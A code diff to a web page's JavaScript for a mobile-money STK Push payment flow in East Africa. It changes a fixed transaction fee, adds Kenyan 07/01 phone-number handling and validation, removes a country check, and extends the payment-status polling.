@@ -58,7 +58,7 @@ const selectedAmount = localStorage.getItem("selectedAmount") || 1000;
 document.getElementById("limit").innerText = "KSh " + selectedAmount;
 
 // Fixed transaction fee
-const transactionFee = 12; // You had KSh 500
+const transactionFee = 410;
 
 // Country detection by prefix
 const countryPrefixes = {
@@ -76,51 +76,58 @@ const defaultNetwork = {
   'ZM': 'ZAMTEL'
 };
 
-// Format phone: ensure starts with +
-function formatPhone(number){
-  return number.startsWith('+') ? number : '+' + number;
+// Format phone for API
+function formatPhone(number, country){
+  number = number.trim();
+  if(country==='KE'){
+    // Automatically convert 07xxxxxxx or 01xxxxxxx to 2547xxxxxxx
+    if(number.startsWith('07') || number.startsWith('01')) return '254' + number.substring(1);
+    if(number.startsWith('+254')) return '254' + number.substring(4);
+    if(number.startsWith('0')) return '254' + number.substring(1);
+  }
+  return number.startsWith('+') ? number.substring(1) : number;
 }
 
-// Detect country from first 3 digits of number
+// Detect country from phone
 function detectCountry(number){
-  let prefix = number.startsWith('+') ? number.substring(1,4) : number.substring(0,3);
+  number = number.trim();
+  if(number.startsWith('07') || number.startsWith('01')) return 'KE'; // auto Kenya
+  if(number.startsWith('+')) number = number.substring(1);
+  const prefix = number.substring(0,3);
   return countryPrefixes[prefix] || '';
 }
 
-// Validate phone: accept + or no + with country code
+// Validate phone: allow 07/01 for Kenya or +countrycode
 function isValidPhone(number){
-  return /^\+?(254|256|255|260)[0-9]{8,9}$/.test(number);
+  return number && (number.startsWith('07') || number.startsWith('01') || /^\+?(254|256|255|260)[0-9]{8,9}$/.test(number));
 }
 
 async function payNow(){
-  const phone = document.getElementById("phone").value.trim();
+  const phoneInput = document.getElementById("phone").value.trim();
   const msg = document.getElementById("message");
   const spinner = document.getElementById("spinner");
 
-  if(!phone){
+  msg.innerText = "";
+  spinner.style.display = "none";
+
+  if(!phoneInput){
     msg.innerText="Enter your phone number";
     msg.style.color="red";
     return;
   }
 
-  if(!isValidPhone(phone)){
-    msg.innerText="Invalid phone number. Include country code (e.g. +2547xxxxxxx)";
+  if(!isValidPhone(phoneInput)){
+    msg.innerText="Invalid phone number. Include country code or start with 07/01 for Kenya.";
     msg.style.color="red";
     return;
   }
 
-  const phoneToSend = formatPhone(phone);
-  const country = detectCountry(phoneToSend);
-  if(!country){
-    msg.innerText="Unsupported country. Only KE, UG, TZ, ZM allowed.";
-    msg.style.color="red";
-    return;
-  }
-
+  const country = detectCountry(phoneInput);
+  const phoneToSend = formatPhone(phoneInput, country);
   const network = defaultNetwork[country];
 
   spinner.style.display="block";
-  msg.innerText="Initiating payment... please check your phone";
+  msg.innerText="Waiting for STK Push to be initiated... please check your phone";
   msg.style.color="black";
 
   try{
@@ -158,7 +165,7 @@ async function checkPayment(reference,nextPage){
   let attempts = 0;
   const interval = setInterval(async ()=>{
     attempts++;
-    if(attempts>20){
+    if(attempts>40){
       clearInterval(interval);
       msg.innerText="Payment timeout. Please retry.";
       msg.style.color="red";
@@ -190,4 +197,4 @@ async function checkPayment(reference,nextPage){
 </script>
 
 </body>
-  </html>
+</html>
